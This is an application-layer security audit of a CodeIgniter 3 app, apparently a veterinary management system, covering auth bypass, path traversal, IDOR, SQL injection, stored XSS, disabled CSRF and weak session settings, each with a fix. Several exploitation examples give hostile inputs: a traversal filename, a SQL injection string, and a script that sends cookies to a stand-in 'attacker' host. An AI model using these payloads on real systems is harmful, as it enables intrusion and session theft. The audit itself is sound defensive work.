# CodeIgniter 3 Security Audit (Application-layer)

Scope reviewed: `application/` and security-relevant config/routing in `application/config/`.
Threat model used: internet-exposed app, untrusted request/cookie/header/upload input.

## Findings

### 1) Unauthenticated dangerous migration endpoint
**Vulnerability:** Authentication/authorization bypass for schema-changing action (`Debug::upgrade`).

**Severity:** Critical

**File:** `application/controllers/Debug.php`

**Line:** 40-51

**Code snippet:**
```php
public function upgrade() : void
{
    // if (!$this->ion_auth->in_group("admin")) { redirect( '/' ); }
    $this->load->library('migration');
    $version = $this->migration->latest();
    ...
}
```

**Why vulnerable:** `Debug` extends `Frontend_Controller` (no auth checks) and `upgrade()` has its admin check commented out. Any unauthenticated user who can reach `/debug/upgrade` can trigger migrations and potentially break or alter production data/schema.

**Exploitation example:**
- Attacker requests `GET /debug/upgrade` repeatedly.
- Application executes migration logic from public internet context.
- Leads to uncontrolled schema state change / operational DoS / data integrity loss.

**Secure fix example:**
```php
class Debug extends Admin_Controller
{
    public function upgrade(): void
    {
        if (!$this->ion_auth->logged_in() || !$this->ion_auth->in_group('admin')) {
            show_error('Forbidden', 403);
            return;
        }
        // optionally disable entirely in production
        if (ENVIRONMENT === 'production') {
            show_error('Forbidden', 403);
            return;
        }
        ...
    }
}
```

---

### 2) Insecure file upload handling + path traversal via filename
**Vulnerability:** File upload path traversal / arbitrary file write using untrusted `file_name`.

**Severity:** Critical

**File:** `application/controllers/Files.php`

**Line:** 79-101, 114-116, 126-148, 152

**Code snippet:**
```php
$file_name = $this->input->post('file_name');
rename($current_file, $this->upload_dir . "stored/f" . $id . "_" . $file_name);
...
file_put_contents($this->upload_dir_tmp . "e" . $event_id . "_" . $this->input->post('file_name'), $content, FILE_APPEND | LOCK_EX);
...
$current_file = $this->upload_dir_tmp . "/e" . $event_id . "_" . $file_name;
rename($current_file, $this->upload_dir . "e" . $event_id . "_" . $file_name);
```

**Why vulnerable:** User-controlled filename is concatenated into filesystem paths with no canonicalization (`basename`, allowlist, realpath constraint). Attackers can inject `../` segments and crafted names. MIME checks alone do not prevent traversal or malicious file placement.

**Exploitation example:**
- Submit `file_name=../../application/logs/pwned.php` (or other traversal payload).
- Upload chunked content via `append/new_file_event` flow.
- Server writes/renames file outside intended upload directory (depending on filesystem permissions and path resolution).

**Secure fix example:**
```php
$original = (string)$this->input->post('file_name');
$safe = preg_replace('/[^A-Za-z0-9._-]/', '_', basename($original));
$ext = strtolower(pathinfo($safe, PATHINFO_EXTENSION));
if (!in_array($ext, ['png','jpg','jpeg','pdf','txt'], true)) {
    show_error('Invalid file extension', 400);
}
$target = rtrim($this->upload_dir, '/').'/stored/f'.$id.'_'.bin2hex(random_bytes(8)).'.'.$ext;
```
Also use CI Upload library with `allowed_types`, `encrypt_name`, max size, and storage outside web root.

---

### 3) IDOR + authorization flaw in file download/delete
**Vulnerability:** Insecure direct object reference and broken authorization for uploaded files.

**Severity:** High

**File:** `application/controllers/Files.php`

**Line:** 216-224, 231-247

**Code snippet:**
```php
public function get_file(int $id)
{
    $file_info = $this->events_upload->get($id);
    force_download(... $file_info ...);
}

public function delete_file(int $id)
{
    $event_info = $this->events_upload->get($id);
    if ($event_info && file_exists(...)) {
        unlink(...); // delete first
    }
    $this->events_upload->where(array('user' => $this->user->id))->delete($id); // auth check only on DB row delete
}
```

**Why vulnerable:**
- `get_file($id)` lacks ownership/event/location authorization; any authenticated vet/accounting/admin can fetch other users' attachments by incrementing IDs.
- `delete_file($id)` unlinks file before enforcing ownership condition, so unauthorized users can delete others' files (DB row might remain, file gone).

**Exploitation example:**
- Authenticated low-privileged user requests `/files/get_file/1234` and accesses another client's attachment.
- Same user calls `/files/delete_file/1234`; file is removed from disk even if row delete is blocked by `where(user=...)`.

**Secure fix example:**
```php
$file = $this->events_upload->get($id);
if (!$file) { show_404(); }
if ((int)$file['user'] !== (int)$this->user->id && !$this->ion_auth->in_group('admin')) {
    show_error('Forbidden', 403);
    return;
}
// only now read/delete the file
```
Also authorize against event ownership/location policy, not only uploader ID.

---

### 4) SQL injection risk from raw SQL string construction (report filters)
**Vulnerability:** SQL injection via unsafely concatenated date input in raw where clauses.

**Severity:** High

**File:** `application/controllers/Reports.php`

**Line:** 253-255

**Code snippet:**
```php
->where('created_at > STR_TO_DATE("' . $search_from . ' 00:00", "%Y-%m-%d %H:%i")', null, null, false, false, true)
->where('created_at < STR_TO_DATE("' . $search_to . ' 23:59", "%Y-%m-%d %H:%i")', null, null, false, false, true)
```

**Why vulnerable:** User input (`POST search_from/search_to`) is directly interpolated into SQL fragments while escaping is disabled (`... true` for raw clause path). Crafted payloads can break out of string context.

**Exploitation example:**
- `search_from=2024-01-01"), "%Y-%m-%d %H:%i") OR 1=1 -- `
- Query condition becomes attacker-controlled, potentially exposing broader data.

**Secure fix example:**
```php
$from = DateTime::createFromFormat('Y-m-d', $search_from);
$to   = DateTime::createFromFormat('Y-m-d', $search_to);
if (!$from || !$to) { show_error('Invalid date', 400); }
$this->db->where('created_at >=', $from->format('Y-m-d').' 00:00:00');
$this->db->where('created_at <=', $to->format('Y-m-d').' 23:59:59');
```
Prefer Query Builder parameterization everywhere.

---

### 5) SQL injection risk in model query construction
**Vulnerability:** SQL injection in `usage_summary()` due to direct variable interpolation.

**Severity:** High

**File:** `application/models/Events_products_model.php`

**Line:** 168-172

**Code snippet:**
```php
ep.product_id = " . $product_id . "
...
ep.created_at >= STR_TO_DATE('" . $search_from . " 00:00', '%Y-%m-%d %H:%i')
...
ep.created_at <= STR_TO_DATE('" . $search_to . " 23:59', '%Y-%m-%d %H:%i')
```

**Why vulnerable:** Method accepts untrusted values and composes raw SQL with concatenation. No escaping/binding is used.

**Exploitation example:**
- Passing `search_from`/`search_to` payloads from report form can alter query semantics and leak data.

**Secure fix example:**
Use Query Builder with bound values:
```php
$this->db->select(...)->from('events_products ep');
$this->db->where('ep.product_id', (int)$product_id);
$this->db->where('ep.created_at >=', $from.' 00:00:00');
$this->db->where('ep.created_at <=', $to.' 23:59:59');
```

---

### 6) Stored XSS risk in views rendering user-controlled data without escaping
**Vulnerability:** Stored XSS (and possible reflected DOM-context XSS in some templates).

**Severity:** High

**File:** `application/controllers/Owners.php`, `application/views/owners/detail.php`, `application/views/product/index.php`

**Line:**
- Input persistence: `Owners.php` 29-45, 69-90
- Output sinks: `owners/detail.php` 12, 71, 82, 85
- JS/HTML sink example: `product/index.php` 153

**Code snippet:**
```php
"first_name" => $this->input->post('first_name'),
"last_name"  => $this->input->post('last_name'),
...
<a ...><?php echo $owner['last_name'] ?></a>
<?php echo $pet['name']; ?>
text:'...<?php echo $loc['name']; ?>',
```

**Why vulnerable:** User-supplied fields are stored and later echoed with raw `echo` in HTML/JS contexts without `html_escape()`/`json_encode()` context-aware encoding.

**Exploitation example:**
- Create owner last name: `<script>fetch('https://attacker/p?c='+document.cookie)</script>`
- Any staff opening owner detail triggers script in browser session.

**Secure fix example:**
```php
<?= html_escape($owner['last_name']); ?>
<?= html_escape($pet['name']); ?>
<script>
const name = <?= json_encode($loc['name'], JSON_HEX_TAG|JSON_HEX_APOS|JSON_HEX_AMP|JSON_HEX_QUOT); ?>;
</script>
```
Also validate input length/charset server-side.

---

### 7) CSRF protection disabled globally
**Vulnerability:** Missing CSRF protection for state-changing requests.

**Severity:** High

**File:** `application/config/config.default.php`

**Line:** 463

**Code snippet:**
```php
$config['csrf_protection'] = false;
```

**Why vulnerable:** With CSRF disabled, authenticated users can be tricked into submitting unintended state-changing requests (owner edits, file operations, stock changes, etc.).

**Exploitation example:**
- Victim (logged-in vet/admin) visits attacker page that auto-submits a hidden form to `/owners/edit/{id}` or `/files/delete_file/{id}`.

**Secure fix example:**
```php
$config['csrf_protection'] = true;
$config['csrf_regenerate'] = true;
```
Ensure all forms/AJAX include CSRF token and reject missing/invalid tokens.

---

### 8) Weak session/cookie hardening and missing encryption key
**Vulnerability:** Session hijacking/fixation risk from weak cookie/session settings; insecure crypto config.

**Severity:** Medium

**File:** `application/config/config.default.php`

**Line:** 339, 396, 398, 418-419

**Code snippet:**
```php
$config['encryption_key'] = '';
$config['sess_match_ip'] = false;
$config['sess_regenerate_destroy'] = false;
$config['cookie_secure'] = false;
$config['cookie_httponly'] = false;
```

**Why vulnerable:**
- Empty encryption key weakens framework features requiring secret key integrity/confidentiality.
- Non-secure/non-HttpOnly cookies increase theft exposure via MITM/XSS.
- Session regeneration settings are less defensive during privilege transitions.

**Exploitation example:**
- On non-HTTPS path, attacker sniffs session cookie.
- With XSS elsewhere, non-HttpOnly cookie theft becomes straightforward.

**Secure fix example:**
```php
$config['encryption_key'] = getenv('CI_ENCRYPTION_KEY'); // 32+ bytes random
$config['cookie_secure'] = true;
$config['cookie_httponly'] = true;
$config['sess_regenerate_destroy'] = true;
```
Also set `SameSite=Lax/Strict` via framework/session configuration.

---

## 1) Architectural risks

- Heavy use of raw SQL string concatenation across models/controllers increases systemic SQLi risk and makes auditability difficult.
- Upload subsystem uses custom chunking and file operations instead of hardened CI Upload library + centralized validation policy.
- Authorization is controller-centric and inconsistent; object-level auth checks are often missing for record/file IDs.
- Debug/operational endpoints are routable in web context; no environment gating pattern.
- Output encoding is inconsistent across views (HTML + JS contexts), enabling stored XSS chains from business data.

## 2) Hardening recommendations for CodeIgniter 3

1. Enable CSRF globally and include token in all forms/AJAX.
2. Enforce context-aware output escaping (`html_escape`, `json_encode` for JS).
3. Replace raw SQL concatenation with Query Builder + bound params.
4. Create centralized authorization policy methods (per entity: owner/pet/event/file).
5. Lock down debug/admin utility endpoints behind role + environment checks.
6. Harden sessions/cookies (`Secure`, `HttpOnly`, `SameSite`, regeneration).
7. Move uploaded files outside web root; randomize file names; strict extension+MIME+size checks.
8. Add server-side validation for all dates/IDs before DB use.
9. Add security headers (CSP, X-Frame-Options, Referrer-Policy, HSTS) via middleware/hook.
10. Add audit logging for sensitive actions (download/delete/export/admin tools) with alerting.

## 3) Priority list of fixes

1. **Immediately disable/secure `/debug/upgrade`** (Critical).
2. **Fix upload path traversal + file authorization flaws** (Critical/High).
3. **Enable CSRF and patch state-changing endpoints** (High).
4. **Patch SQLi-prone query paths used by report screens** (High).
5. **Implement output escaping and remediate stored XSS sinks** (High).
6. **Harden session/cookie/encryption config** (Medium).
7. **Refactor remaining raw SQL hotspots and add regression security tests** (Medium).

## 4) Suspicious items for manual review

- Any additional routes exposing `Debug`, admin tools, or maintenance functions in production.
- Remaining raw SQL instances flagged by grep (multiple models show concatenation patterns).
- All file-system writes/reads under `data/` for symlink and path canonicalization issues.
- API key lifecycle and transport model (`ApiKey_model::findActive`) to confirm whether plaintext/hash handling is intended.
- Historical logs and exports for sensitive data leakage / excessive PII.
